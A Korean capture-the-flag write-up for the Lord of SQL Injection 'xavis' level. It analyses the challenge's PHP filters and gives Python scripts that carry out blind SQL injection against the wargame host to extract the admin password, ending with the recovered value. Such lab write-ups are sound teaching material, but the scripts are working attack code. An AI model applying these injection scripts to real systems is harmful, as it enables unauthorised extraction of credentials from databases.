# Lord of SQL Injection No.19 - xavis

## 문제 출제 의도

주석 필터링을 우회하고 MySQL Auto Casting을 이용하여 SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석

xavis 문제의 php 소스 코드는 다음과 같다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```
-----

```php
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
```
* GET방식으로 pw를 받고, pw에 `prob`, `_`, `.`, `()`, `#`, `-` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, pw에 `regex`, `like` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

```php
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
```
* 받은 pw가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* `$result['id']`에 "0"을 제외한 어떤 값이든 들어 있으면 응답에 "Hello "와 `$result[id]` 값을 붙인 문자열이 포함된다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 pw와 GET방식으로 전달받은 pw가 같음'이다. 즉, 실제 데이터베이스에 저장된 pw를 알아내서 전달해야 한다.

-----

## Solution
    
1. pw의 범위 확장

    이 문제는 얼핏 보면 지금까지의 Blind SQL Injection 문제들과 거의 동일하다.
    
    따라서 지금까지의 문제들을 해결하는 데 이용한 Python 코드를 그대로 활용해서 문제 풀이를 시도해 볼 수 있다.

    ```python
    import urllib.request
    from urllib.parse import quote

    key = ""

    pwlen = 0

    for i in range(1, 50): # 20까지 시도로 찾아지지 않아서 50으로 늘림
        url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
        data = "' or id='admin' and length(pw)='{}'#".format(str(i))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)

        re.add_header(
            "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
        re.add_header(
            "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
        )

        req = urllib.request.urlopen(re)

        if str(req.read()).find("Hello admin") != -1:
            pwlen = i
            print('pw length : ' + str(pwlen))
            break

    for i in range(1, pwlen + 1):
        for j in range(32, 127):
            url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
            data = "' or id='admin' and substr(pw, 1, {})='{}'#".format(
                str(i), key + chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)

            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header(
                "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
            )

            req = urllib.request.urlopen(re)

            if str(req.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ```

    이때, 패스워드는 40바이트라는 것을 알아낼 수 있으나 두번째 루프에서 패스워드를 찾지 못하는 것을 알 수 있다.

    이로 화면에 표현할 수 있는 아스키 코드의 범위인 32에서 126까지 범위에 패스워드가 들어있지 않음을 추측할 수 있다.

    따라서 코드를 수정한다.

    ```python
    import urllib.request
    from urllib.parse import quote

    key = ""
    hexcode = "0x"

    pwlen = 40

    for i in range(1, pwlen + 1):
        for j in range(32, 1000):  # 범위 확장
            url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="
            data = "' or id='admin' and ord(substr(pw, {}, 1))='{}'#".format(
                str(i), str(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)

            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header(
                "Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2"
            )

            req = urllib.request.urlopen(re)

            if str(req.read()).find("Hello admin") != -1:
                key += chr(j)
                hexcode += hex(j)[2:]
                print('key : ' + key)
                print('hex : ' + hexcode)
                break
    print(key)
    ```

    이러한 코드를 실행하면 결과값으로 0xb8f9c5b0c6d0c4a1a4bb 를 출력한다.
    이를 Unicode 문자로 변환한 ¸ùÅ°ÆÐÄ¡¤»를 GET방식으로 pw의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=¸ùÅ°ÆÐÄ¡¤»
    ```